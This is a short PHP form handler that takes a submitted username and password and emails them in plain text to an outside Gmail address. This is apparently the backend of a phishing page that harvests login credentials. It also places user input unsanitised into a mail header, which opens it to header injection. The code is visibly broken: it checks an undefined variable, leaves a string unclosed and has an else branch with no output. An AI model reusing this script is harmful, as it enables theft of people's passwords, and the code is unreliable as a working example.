 <?php
        if(isset($_POST['submit']))
         {
        
            $username = $_POST["username"];
            $password = $_POST["password"];

            $email_from = 'demowiseking@gmail.com';
            $email_subject = 'New form submission';
            $email_body = "Username: $username .\n". 
            "Password: $password .\n";
        
            $to_email = "demoictworld@gmail.com"; 
            $headers = "From: $email_from \r\n"; 
            $headers .= "Reply-To: $username \r\n";
        
            // Send the email
            if ($response->success)
            {
                mail( $to_email, $email_subject, $email_body, $headers);
                echo "message sent;
                   }
                   else{
                    "message not sent"
                   }
        
                
                }
        ?>
